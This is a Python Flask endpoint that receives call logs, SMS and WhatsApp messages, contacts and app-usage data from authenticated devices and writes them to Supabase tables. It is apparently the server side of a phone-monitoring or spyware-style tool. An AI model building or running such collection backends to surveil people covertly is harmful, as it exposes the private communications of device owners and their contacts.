import json
import time # For the delay buffer
from flask import Blueprint, request, jsonify
from database import supabase

vault_bp = Blueprint('vault_bp', __name__)

@vault_bp.route('/api/vault/sync', methods=['POST'])
def sync_vault_data():
    token = request.headers.get('X-Device-Token')
    data = request.get_json() or {}

    if not token:
        return jsonify({"status": "error", "message": "Access Refused"}), 401

    device_check = supabase.table('devices').select('id').eq('device_token', token).execute()
    if not device_check.data:
        return jsonify({"status": "error", "message": "Device not authenticated"}), 403
    
    dev_id = device_check.data[0]['id']
    payloads = data.get("payloads", [])

    if not payloads:
        return jsonify({"status": "success", "message": "Vault empty, nothing to sync."})

    for item in payloads:
        module_type = item.get("moduleType") or item.get("module_type", "")
        raw_payload = item.get("payloadJson") or item.get("payload_json", "[]")
        
        try:
            parsed_data = json.loads(raw_payload)
        except Exception:
            continue
            
        if not parsed_data or not isinstance(parsed_data, list):
            continue
            
        try:
            if module_type == "calls":
                records = [{"device_id": dev_id, "phone_number": c.get("number", ""), "type": c.get("type", ""), "duration": c.get("duration", 0), "timestamp": c.get("timestamp", ""), "contact_name": c.get("contact_name", "")} for c in parsed_data]
                supabase.table('calls').insert(records).execute()
                
            elif module_type == "sms":
                records = [{"device_id": dev_id, "sender": c.get("number", ""), "message": c.get("message", ""), "timestamp": c.get("timestamp", ""), "type": c.get("type", ""), "contact_name": c.get("contact_name", "")} for c in parsed_data]
                supabase.table('messages').insert(records).execute()
                
            elif module_type == "whatsapp":
                records = [{"device_id": dev_id, "sender": c.get("number", ""), "message": c.get("message", ""), "timestamp": c.get("timestamp", ""), "type": c.get("type", ""), "contact_name": c.get("contact_name", "")} for c in parsed_data]
                supabase.table('whatsapp_logs').insert(records).execute()
                
            elif module_type == "contacts":
                # Step 1: Wipe old contacts to prevent duplicates
                supabase.table('contacts').delete().eq('device_id', dev_id).execute()
                
                records = [{"device_id": dev_id, "name": c.get("name", ""), "phone_number": c.get("phone_number", "")} for c in parsed_data]
                
                # Step 2: 🚀 The 50-chunking logic with a 30s delay buffer
                batch_size = 50
                for i in range(0, len(records), batch_size):
                    chunk = records[i:i+batch_size]
                    supabase.table('contacts').insert(chunk).execute()
                    
                    if i + batch_size < len(records): 
                        time.sleep(30) # Pauses for 30 seconds before pushing the next 50
                
            elif module_type in ["app_usage", "installed_apps"]:
                records = [{"device_id": dev_id, "app_name": c.get("app_name", ""), "package_name": c.get("package_name", ""), "time_spent": c.get("time_spent", 0)} for c in parsed_data]
                supabase.table('app_usage').delete().eq('device_id', dev_id).execute()
                supabase.table('app_usage').insert(records).execute()
                
        except Exception as e:
            print(f"Failed to route module {module_type}: {str(e)}")
            continue

    return jsonify({"status": "success", "message": "Vault data intelligently routed to respective tables."})
